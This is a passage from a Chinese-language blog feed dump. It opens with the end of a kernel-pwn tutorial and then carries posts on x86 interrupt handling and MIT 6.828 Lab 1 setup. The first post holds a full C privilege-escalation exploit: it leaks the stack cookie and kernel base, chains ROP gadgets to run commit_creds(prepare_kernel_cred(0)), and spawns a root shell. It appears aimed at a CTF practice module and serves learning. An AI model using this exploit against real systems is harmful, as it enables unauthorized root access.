class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">    );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Saved state&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_leak</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> *leak, <span class="keyword">unsigned</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">unsigned</span> i = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%u: %lx\n&quot;</span>, i, leak[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> cookie;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> image_base;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> kpti_trampoline;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> pop_rax_ret; <span class="comment">// pop rax; ret</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> read_mem_pop1_ret; <span class="comment">// mov eax, qword ptr [rax + 0x10]; pop rbp; ret;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> pop_rdi_rbp_ret; <span class="comment">// pop rdi; pop rbp; ret;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> ksymtab_prepare_kernel_cred;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> ksymtab_commit_creds;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> prepare_kernel_cred;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> commit_creds;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> returned_creds_struct;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> tmp_store; <span class="comment">// variable to store rax after each stage</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">leak</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> n = <span class="number">40</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> leak[n];</span><br><span class="line">    <span class="keyword">ssize_t</span> r = read(global_fd, leak, <span class="keyword">sizeof</span>(leak));</span><br><span class="line">    cookie = leak[<span class="number">16</span>];</span><br><span class="line">    image_base = leak[<span class="number">38</span>] - <span class="number">0xa157</span>ULL;</span><br><span class="line">    kpti_trampoline = image_base + <span class="number">0x200f10</span>UL + <span class="number">22UL</span>;</span><br><span class="line">    pop_rax_ret = image_base + <span class="number">0x4d11</span>UL;</span><br><span class="line">    read_mem_pop1_ret = image_base + <span class="number">0x4aae</span>UL;</span><br><span class="line">    pop_rdi_rbp_ret = image_base + <span class="number">0x38a0</span>UL;</span><br><span class="line">    ksymtab_prepare_kernel_cred = image_base + <span class="number">0xf8d4fc</span>UL;</span><br><span class="line">    ksymtab_commit_creds = image_base + <span class="number">0xf87d90</span>UL;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] Leaked %zd bytes\n&quot;</span>, r);</span><br><span class="line">    <span class="comment">//print_leak(leak, n);</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;    --&gt; Cookie: %lx\n&quot;</span>, cookie);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;    --&gt; Image base: %lx\n&quot;</span>, image_base);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">stage_1</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">stage_2</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">stage_3</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">stage_4</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// STAGE 1: leak commit_creds()</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_commit_creds</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">stage_1</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> n = <span class="number">50</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> payload[n];</span><br><span class="line">    <span class="keyword">unsigned</span> off = <span class="number">16</span>;</span><br><span class="line">    payload[off++] = cookie;</span><br><span class="line">    payload[off++] = <span class="number">0x0</span>; <span class="comment">// rbx</span></span><br><span class="line">    payload[off++] = <span class="number">0x0</span>; <span class="comment">// r12</span></span><br><span class="line">    payload[off++] = <span class="number">0x0</span>; <span class="comment">// rbp</span></span><br><span class="line">    payload[off++] = pop_rax_ret; <span class="comment">// return address</span></span><br><span class="line">    payload[off++] = ksymtab_commit_creds - <span class="number">0x10</span>; <span class="comment">// rax &lt;- __ksymtabs_commit_creds - 0x10</span></span><br><span class="line">    payload[off++] = read_mem_pop1_ret; <span class="comment">// rax &lt;- [__ksymtabs_commit_creds]</span></span><br><span class="line">    payload[off++] = <span class="number">0x0</span>; <span class="comment">// dummy rbp</span></span><br><span class="line">    payload[off++] = kpti_trampoline; <span class="comment">// swapgs_restore_regs_and_return_to_usermode + 22</span></span><br><span class="line">    payload[off++] = <span class="number">0x0</span>; <span class="comment">// dummy rax</span></span><br><span class="line">    payload[off++] = <span class="number">0x0</span>; <span class="comment">// dummy rdi</span></span><br><span class="line">    payload[off++] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)get_commit_creds;</span><br><span class="line">    payload[off++] = user_cs;</span><br><span class="line">    payload[off++] = user_rflags;</span><br><span class="line">    payload[off++] = user_sp;</span><br><span class="line">    payload[off++] = user_ss;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Prepared payload to leak commit_creds()&quot;</span>);</span><br><span class="line">    <span class="keyword">ssize_t</span> w = write(global_fd, payload, <span class="keyword">sizeof</span>(payload));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[!] Should never be reached&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_commit_creds</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov tmp_store, rax;&quot;</span></span><br><span class="line">    );</span><br><span class="line">    commit_creds = ksymtab_commit_creds + (<span class="keyword">int</span>)tmp_store;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;    --&gt; commit_creds: %lx\n&quot;</span>, commit_creds);</span><br><span class="line">    stage_2();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// STAGE 2: leak prepare_kernel_cred()</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_prepare_kernel_cred</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">stage_2</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> n = <span class="number">50</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> payload[n];</span><br><span class="line">    <span class="keyword">unsigned</span> off = <span class="number">16</span>;</span><br><span class="line">    payload[off++] = cookie;</span><br><span class="line">    payload[off++] = <span class="number">0x0</span>; <span class="comment">// rbx</span></span><br><span class="line">    payload[off++] = <span class="number">0x0</span>; <span class="comment">// r12</span></span><br><span class="line">    payload[off++] = <span class="number">0x0</span>; <span class="comment">// rbp</span></span><br><span class="line">    payload[off++] = pop_rax_ret; <span class="comment">// return address</span></span><br><span class="line">    payload[off++] = ksymtab_prepare_kernel_cred - <span class="number">0x10</span>; <span class="comment">// rax &lt;- __ksymtabs_prepare_kernel_cred - 0x10</span></span><br><span class="line">    payload[off++] = read_mem_pop1_ret; <span class="comment">// rax &lt;- [__ksymtabs_prepare_kernel_cred]</span></span><br><span class="line">    payload[off++] = <span class="number">0x0</span>; <span class="comment">// dummy rbp</span></span><br><span class="line">    payload[off++] = kpti_trampoline; <span class="comment">// swapgs_restore_regs_and_return_to_usermode + 22</span></span><br><span class="line">    payload[off++] = <span class="number">0x0</span>; <span class="comment">// dummy rax</span></span><br><span class="line">    payload[off++] = <span class="number">0x0</span>; <span class="comment">// dummy rdi</span></span><br><span class="line">    payload[off++] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)get_prepare_kernel_cred;</span><br><span class="line">    payload[off++] = user_cs;</span><br><span class="line">    payload[off++] = user_rflags;</span><br><span class="line">    payload[off++] = user_sp;</span><br><span class="line">    payload[off++] = user_ss;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Prepared payload to leak prepare_kernel_cred()&quot;</span>);</span><br><span class="line">    <span class="keyword">ssize_t</span> w = write(global_fd, payload, <span class="keyword">sizeof</span>(payload));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[!] Should never be reached&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_prepare_kernel_cred</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov tmp_store, rax;&quot;</span></span><br><span class="line">    );</span><br><span class="line">    prepare_kernel_cred = ksymtab_prepare_kernel_cred + (<span class="keyword">int</span>)tmp_store;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;    --&gt; prepare_kernel_cred: %lx\n&quot;</span>, prepare_kernel_cred);</span><br><span class="line">    stage_3();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// STAGE 3: call prepare_kernel_cred(0)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">after_prepare_kernel_cred</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">stage_3</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> n = <span class="number">50</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> payload[n];</span><br><span class="line">    <span class="keyword">unsigned</span> off = <span class="number">16</span>;</span><br><span class="line">    payload[off++] = cookie;</span><br><span class="line">    payload[off++] = <span class="number">0x0</span>; <span class="comment">// rbx</span></span><br><span class="line">    payload[off++] = <span class="number">0x0</span>; <span class="comment">// r12</span></span><br><span class="line">    payload[off++] = <span class="number">0x0</span>; <span class="comment">// rbp</span></span><br><span class="line">    payload[off++] = pop_rdi_rbp_ret; <span class="comment">// return address</span></span><br><span class="line">    payload[off++] = <span class="number">0</span>; <span class="comment">// rdi &lt;- 0</span></span><br><span class="line">    payload[off++] = <span class="number">0</span>; <span class="comment">// dummy rbp</span></span><br><span class="line">    payload[off++] = prepare_kernel_cred; <span class="comment">// prepare_kernel_cred(0)</span></span><br><span class="line">    payload[off++] = kpti_trampoline; <span class="comment">// swapgs_restore_regs_and_return_to_usermode + 22</span></span><br><span class="line">    payload[off++] = <span class="number">0x0</span>; <span class="comment">// dummy rax</span></span><br><span class="line">    payload[off++] = <span class="number">0x0</span>; <span class="comment">// dummy rdi</span></span><br><span class="line">    payload[off++] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)after_prepare_kernel_cred;</span><br><span class="line">    payload[off++] = user_cs;</span><br><span class="line">    payload[off++] = user_rflags;</span><br><span class="line">    payload[off++] = user_sp;</span><br><span class="line">    payload[off++] = user_ss;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Prepared payload to call prepare_kernel_cred(0)&quot;</span>);</span><br><span class="line">    <span class="keyword">ssize_t</span> w = write(global_fd, payload, <span class="keyword">sizeof</span>(payload));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[!] Should never be reached&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">after_prepare_kernel_cred</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov tmp_store, rax;&quot;</span></span><br><span class="line">    );</span><br><span class="line">    returned_creds_struct = tmp_store;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;    --&gt; returned_creds_struct: %lx\n&quot;</span>, returned_creds_struct);</span><br><span class="line">    stage_4();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// STAGE 4: call commit_creds(returned_creds_struct), open shell</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">stage_4</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> n = <span class="number">50</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> payload[n];</span><br><span class="line">    <span class="keyword">unsigned</span> off = <span class="number">16</span>;</span><br><span class="line">    payload[off++] = cookie;</span><br><span class="line">    payload[off++] = <span class="number">0x0</span>; <span class="comment">// rbx</span></span><br><span class="line">    payload[off++] = <span class="number">0x0</span>; <span class="comment">// r12</span></span><br><span class="line">    payload[off++] = <span class="number">0x0</span>; <span class="comment">// rbp</span></span><br><span class="line">    payload[off++] = pop_rdi_rbp_ret; <span class="comment">// return address</span></span><br><span class="line">    payload[off++] = returned_creds_struct; <span class="comment">// rdi &lt;- returned_creds_struct</span></span><br><span class="line">    payload[off++] = <span class="number">0</span>; <span class="comment">// dummy rbp</span></span><br><span class="line">    payload[off++] = commit_creds; <span class="comment">// commit_creds(returned_creds_struct)</span></span><br><span class="line">    payload[off++] = kpti_trampoline; <span class="comment">// swapgs_restore_regs_and_return_to_usermode + 22</span></span><br><span class="line">    payload[off++] = <span class="number">0x0</span>; <span class="comment">// dummy rax</span></span><br><span class="line">    payload[off++] = <span class="number">0x0</span>; <span class="comment">// dummy rdi</span></span><br><span class="line">    payload[off++] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)get_shell;</span><br><span class="line">    payload[off++] = user_cs;</span><br><span class="line">    payload[off++] = user_rflags;</span><br><span class="line">    payload[off++] = user_sp;</span><br><span class="line">    payload[off++] = user_ss;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Prepared payload to call commit_creds(returned_creds_struct)&quot;</span>);</span><br><span class="line">    <span class="keyword">ssize_t</span> w = write(global_fd, payload, <span class="keyword">sizeof</span>(payload));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[!] Should never be reached&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Returned to userland&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (getuid() == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] UID: %d, got root!\n&quot;</span>, getuid());</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[!] UID: %d, didn&#x27;t get root\n&quot;</span>, getuid());</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    save_state();</span><br><span class="line"></span><br><span class="line">    open_dev();</span><br><span class="line"></span><br><span class="line">    leak();</span><br><span class="line"></span><br><span class="line">    stage_1();</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[!] Should never be reached&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><p>参考博客</p><p><a href="https://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1/">https://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1/</a></p><p><a href="https://lkmidas.github.io/posts/20210128-linux-kernel-pwn-part-2/">https://lkmidas.github.io/posts/20210128-linux-kernel-pwn-part-2/</a></p><p><a href="https://lkmidas.github.io/posts/20210205-linux-kernel-pwn-part-3/">https://lkmidas.github.io/posts/20210205-linux-kernel-pwn-part-3/</a></p>]]></content>
      
      
      <categories>
          
          <category> kernel pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> kernel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>操作系统之中断</title>
      <link href="/2022/04/04/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B9%8B%E4%B8%AD%E6%96%AD/"/>
      <url>/2022/04/04/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B9%8B%E4%B8%AD%E6%96%AD/</url>
      
        <content type="html"><![CDATA[<h2 id="中断概念"><a href="#中断概念" class="headerlink" title="中断概念"></a>中断概念</h2><p>整个操作系统是中断驱动的死循环，其他事情都是由操作系统提前注册的中断机制和其对应的中断处理函数完成的。</p><p>说人话就是当我们点一下鼠标、敲一下键盘、执行一个程序，都是通过中断的方式来通知操作系统帮我们处理这些问题，当没有任何需要操作系统处理的事件时，它就老老实实的呆在死循环里。</p><h2 id="中断分类"><a href="#中断分类" class="headerlink" title="中断分类"></a>中断分类</h2><p>中断可以分为<strong>中断</strong>和<strong>异常</strong>，异常又可以分为<strong>故障</strong>、<strong>陷阱</strong>和<strong>中止</strong>。</p><p>中断：异步事件，通常由 IO 设备触发。</p><p>异常：同步事件，是 CPU 在执行指令时检测到的反常条件。</p><p>本质：都是让 CPU 收到一个中断号。</p><h2 id="具体实现"><a href="#具体实现" class="headerlink" title="具体实现"></a>具体实现</h2><ul><li>先来讲讲<strong>中断</strong>具体是怎么实现的：</li></ul><p>是由一个叫<strong>可编程中断控制器</strong>的设备，它有很多 IRQ 引脚线，并接入了一些能发出中断请求的硬件设备，可编程中断控制器设置了 IRQ 和中断号的对应关系。当硬件设备发出中断请求，可编程中断控制器就会找到对应的中断号，并存在自己的一个端口上，然后给 CPU 的 INTR 引脚发送信号。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/czxt-zd/1652345660829161/eaa3a19ae1c1098aa0216c3fc4e6ad3aa01e344c.png" alt="未命名图片"></p><ul><li>再讲讲<strong>异常</strong>是怎么实现的：</li></ul><p>异常顾名思义，就是 CPU 自己执行指令的时候检测到一些反常情况，然后自己给自己一个中断号。</p><p>还有一种方式可以给 CPU 一个中断号，那就是 INT 指令(注：它不是中断！而是越过中断这个方式直接给系统中断号)：</p><p>就比如最常见的 INT 0x80，就是告诉 CPU 中断号是 0x80，CPU 将其翻译成系统调用。</p><p>所以总结一下 CPU 获取中断号的三种方式就是：</p><ul><li>通过可编程中断控制器给 CPU 的 INTR 引脚发送信号</li><li>CPU 执行过程中自己发现了异常</li><li>执行 INT 指令</li></ul><h2 id="收到中断号后-CPU-的处理"><a href="#收到中断号后-CPU-的处理" class="headerlink" title="收到中断号后 CPU 的处理"></a><strong>收到中断号后</strong> <strong>CPU</strong> 的处理</h2><p>CPU 收到一个中断号n，会去中断描述符表中寻找第 n 个中断描述符，从中断描述符中找到中断处理程序的地址，再跳过去。</p><p>补充一下中断描述符中找到中断处理程序的地址的过程，从中断描述符里找到的不直接是程序的地址，而是<strong>段选择子</strong>和<strong>段内偏移地址</strong>。段选择子又会去<strong>全局描述符表</strong>中寻找<strong>段描述符</strong>，从中取出<strong>基地址</strong>。最后再利用段基址+段内偏移地址的方式找到真正的地址。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/czxt-zd/1652360090795166/42f46bcc16a68da1fc677c11097bb1f6b46d5182.png" alt="未命名图片"></p><p>中断描述符表：内存中的数组，一般表都是数组</p><p>例如：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">desc_struct</span> <span class="title">idt_table</span>[256] =</span> &#123; &#123;<span class="number">0</span>, <span class="number">0</span>&#125;, &#125;;</span><br></pre></td></tr></table></figure><p>中断描述符：中断描述符表这个数组里的存储的数据结构，分为任意门描述符、中断门描述符、陷阱门描述符</p><p>例如：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">desc_struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> a,b;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="CPU-怎么找到中断描述符表"><a href="#CPU-怎么找到中断描述符表" class="headerlink" title="CPU 怎么找到中断描述符表"></a><strong>CPU</strong> 怎么找到中断描述符表</h2><p>中断描述符表想放哪放哪，只需要告诉CPU位置即可。</p><p>怎么告诉呢？操作系统的代码可以通过 <strong>LIDT</strong> <strong>指令</strong>，将中断描述符表的起始地址，和中断描述符表的大小存放在 <strong>IDTR</strong> <strong>寄存器</strong> 中。IDTR 寄存器前 16 位存放了表的大小，后 32 位存放的就是 表的起始地址。</p><h2 id="是谁把中断描述符表写在内存的？"><a href="#是谁把中断描述符表写在内存的？" class="headerlink" title="是谁把中断描述符表写在内存的？"></a>是谁把中断描述符表写在内存的？</h2><p>答：操作系统</p><p>例如 Linux-2.6.0 的 traps.c </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __init <span class="title">trap_init</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    set_trap_gate(<span class="number">0</span>, &amp;divide_error);<span class="comment">//除法异常</span></span><br><span class="line">    ...</span><br><span class="line">    set_trap_gate(<span class="number">6</span>, &amp;invalid_op);<span class="comment">//非法指令异常</span></span><br><span class="line">    ...</span><br><span class="line">    set_intr_gate(<span class="number">14</span>, &amp;page_fault);<span class="comment">//缺页异常</span></span><br><span class="line">    ...</span><br><span class="line">    set_system_gate(<span class="number">0x80</span>, &amp;system_call);<span class="comment">// INT 0x80 的系统调用</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="CPU-对中断处理程序地址的处理"><a href="#CPU-对中断处理程序地址的处理" class="headerlink" title="CPU 对中断处理程序地址的处理"></a><strong>CPU</strong> 对中断处理程序地址的处理</h2><p>之前有说，CPU 在接收到中断号的地址后会去找中断处理程序地址，然后跳过去。那么找到地址后<strong>跳过去</strong>的这个过程具体是怎么实现的呢？</p><p>并不是像想象中的，直接把地址取出来然后放入 CS:IP 寄存器中。而是额外做了很多压栈操作：</p><ul><li>如果发生了特权级转移，压入中断前的 SS 和 ESP，将堆栈切换为 TSS(不懂这个切换)</li><li>压入EFLAGS(标志寄存器)</li><li>压入中断前的 CS 和 EIP，</li><li>如果中断有错误码，压入错误码 ERROR_CODE</li><li>结束(跳转到中断程序)</li></ul><p>压栈的目的就是为了保护现场(原来的程序地址、原来的程序堆栈、原来的标志位)和传递信息(错误码)</p><p>整个操作结束后就会变成这样：</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/czxt-zd/1652360293372656/4064c5ab2040cd873674f41974719b38cf26b300.png" alt="未命名图片"></p><p>压栈之后配合程序中写入的 IRET 或 IRETD 指令返回</p><hr><p>以 Linux-0.11 版源码中的 除法异常的中断处理函数 asm.s 为例</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">_divide_error:</span><br><span class="line"> push dword ptr _do_divide_error ;</span><br><span class="line">no_error_code: ;</span><br><span class="line"> xchg [esp],eax ;</span><br><span class="line"> push ebx</span><br><span class="line"> push ecx</span><br><span class="line"> push edx</span><br><span class="line"> push edi</span><br><span class="line"> push esi</span><br><span class="line"> push ebp</span><br><span class="line"> push ds ;</span><br><span class="line"> push es</span><br><span class="line"> push fs</span><br><span class="line"> push 0 ;</span><br><span class="line"> lea edx,[esp+44] ;</span><br><span class="line"> push edx</span><br><span class="line"> mov edx,10h ;</span><br><span class="line"> mov ds,dx</span><br><span class="line"> mov es,dx</span><br><span class="line"> mov fs,dx</span><br><span class="line"> call eax ;</span><br><span class="line"> add esp,8 ;</span><br><span class="line"> pop fs</span><br><span class="line"> pop es</span><br><span class="line"> pop ds</span><br><span class="line"> pop ebp</span><br><span class="line"> pop esi</span><br><span class="line"> pop edi</span><br><span class="line"> pop edx</span><br><span class="line"> pop ecx</span><br><span class="line"> pop ebx</span><br><span class="line"> pop eax ;&#x2F;&#x2F; 弹出原来eax 中的内容。</span><br><span class="line"> iretd</span><br></pre></td></tr></table></figure><p>可以看到最后一行确实用了 iretd 指令</p><p>这个指令会依次弹出栈顶的三个元素，把它们分别赋值给 EIP，CS 和 EFLAGS，也恰好符合了之前讲到的栈顶的前三个元素。</p><hr><h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><p>中断大体可以分为硬中断和软中断。之前讲的这些其实都是硬中断。</p><p>硬中断：并不是指硬件中断，而是指 CPU 这个硬件<strong>实现</strong>的中断机制(注意不是触发机制)。</p><p>软中断：纯粹由软件实现的一种类似中断的机制，实际上就是模仿硬件，在内存中存储着软中断的标志位，然后由内核的一个线程不断轮询这些标志位，哪个有效，就再去别的地方找这个软中断对应的中断处理程序。</p><p>软中断要和 INT n 这种<strong>软件中断</strong>区分开来，软件中断最好称其为，由软件<strong>触发</strong>的中断，而软中断称其为软件<strong>实现</strong>的中断。</p>]]></content>
      
      
      <categories>
          
          <category> 操作系统 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 操作系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MIT6.828-Lab1</title>
      <link href="/2022/03/31/MIT6-828-Lab1/"/>
      <url>/2022/03/31/MIT6-828-Lab1/</url>
      
        <content type="html"><![CDATA[<p> 实验地址：<a href="https://pdos.csail.mit.edu/6.828/2018/schedule.html">https://pdos.csail.mit.edu/6.828/2018/schedule.html</a></p><p>理论的东西就不多说了，另一篇专门讲操作系统的博客已经讲的很清楚了，做这个主要是想上手调试一下。</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>Ubuntu 18.04 环境还是要再配置一下：<a href="https://zhuanlan.zhihu.com/p/58143429">https://zhuanlan.zhihu.com/p/58143429</a></p><p>然后就是将课程克隆到本地</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mkdir ~&#x2F;6.828</span><br><span class="line">cd ~&#x2F;6.828</span><br><span class="line">git clone https:&#x2F;&#x2F;pdos.csail.mit.edu&#x2F;6.828&#x2F;2018&#x2F;jos.git lab</span><br><span class="line">cd lab</span><br></pre></td></tr></table></figure><h2 id="Exercise-1"><a href="#Exercise-1" class="headerlink" title="Exercise 1"></a>Exercise 1</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">熟悉 6.828 参考页上提供的汇编语言材料。您现在不必阅读它们，但在阅读和编写 x86 程序集时，您几乎肯定会想参考其中的一些材料。</span><br><span class="line">我们建议您阅读 Brennan 的内联汇编指南中的“语法”部分。它对我们将在 JOS 中与 GNU 汇编器一起使用的 AT&amp;T 